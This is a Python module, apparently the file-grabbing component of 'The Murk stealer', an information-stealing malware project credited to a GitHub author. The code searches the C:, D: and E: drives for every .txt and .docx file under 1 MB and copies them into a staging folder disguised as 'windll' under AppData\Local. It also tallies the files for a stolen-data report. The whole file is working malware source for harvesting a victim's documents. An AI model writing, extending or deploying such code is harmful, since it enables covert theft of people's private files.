#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#


"""
All imports
"""
import os
import shutil
import pathlib
import os.path


"""
Function for copy .docx files
"""
def CopyDOCX(flist, path, count):
    for i in range (len(flist)):
        count+=1
        try:
            num = flist[i].rfind("\\")
            fname = flist[i][num+1:]
            print(flist[i])
            size = os.path.getsize(flist[i])
            if size < 1000000:
                shutil.copy2(flist[i],rf'{path}\windll\File-Grubber\{fname[:-5]}___{count}.docx')
        except Exception as e:
                print(e)
    print("done")
    return count



"""
Function for copy .txt files
"""
def CopyTXT(flist, path, count):
    for i in range (len(flist)):
        count+=1
        try:
            num = flist[i].rfind("\\")
            fname = flist[i][num+1:]
            print(flist[i])
            size = os.path.getsize(flist[i])
            if size < 1000000:
                shutil.copy2(flist[i],rf'{path}\windll\File-Grubber\{fname[:-4]}___{count}.txt')
        except Exception as e:
                print(e)
    print("done")
    return count



"""
main function
"""
def Grab(data):
    os.chdir("C:")
    try:
        mainPath = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
        try:
            os.makedirs(rf'{mainPath}\windll\File-Grubber')
        except:
            pass
        try:
            data.append("\n\nFile-grabber")
            """
            paths for search
            """
            fileDir = r"C:"
            fileDir1 = r"D:"
            fileDir2 = r"E:"
            fileExt = r"**\*.txt"
            fileExt1 = r"**\*.docx"
            txtCounter = 0
            docxCounter = 0
            print("fg on")
            """
            get all paths to files
            """
            filesTXT_С = list(str(_) for _ in pathlib.Path(fileDir).glob(fileExt))
            filesDOCX_С = list(str(_) for _ in pathlib.Path(fileDir).glob(fileExt1))
            filesTXT_D = list(str(_) for _ in pathlib.Path(fileDir1).glob(fileExt))
            filesDOCX_D = list(str(_) for _ in pathlib.Path(fileDir1).glob(fileExt1))
            filesTXT_E = list(str(_) for _ in pathlib.Path(fileDir2).glob(fileExt))
            filesDOCX_E = list(str(_) for _ in pathlib.Path(fileDir2).glob(fileExt1))
            """
            copy files
            """
            try:
               txtCounter= CopyTXT(filesTXT_С,mainPath,txtCounter)
            except Exception as e:
                print(e)
            try:
                docxCounter =CopyDOCX(filesDOCX_С,mainPath,docxCounter)
            except Exception as e:
                print(e)
            try:
                txtCounter=CopyTXT(filesTXT_D,mainPath,txtCounter)
            except Exception as e:
                print(e)
            try:
                docxCounter =CopyDOCX(filesDOCX_D,mainPath,docxCounter)
            except Exception as e:
                print(e)
            try:
                txtCounter=CopyTXT(filesTXT_E,mainPath,txtCounter)
            except Exception as e:
                print(e)
            try:
                docxCounter =CopyDOCX(filesDOCX_E,mainPath,docxCounter)
            except Exception as e:
                print(e)
            data.append(f"\n∟📄files.txt: {txtCounter}")
            data.append(f"\n∟📒files.docx: {docxCounter}")
        except Exception as e:
            print(e)
        return data
    except:
        return data


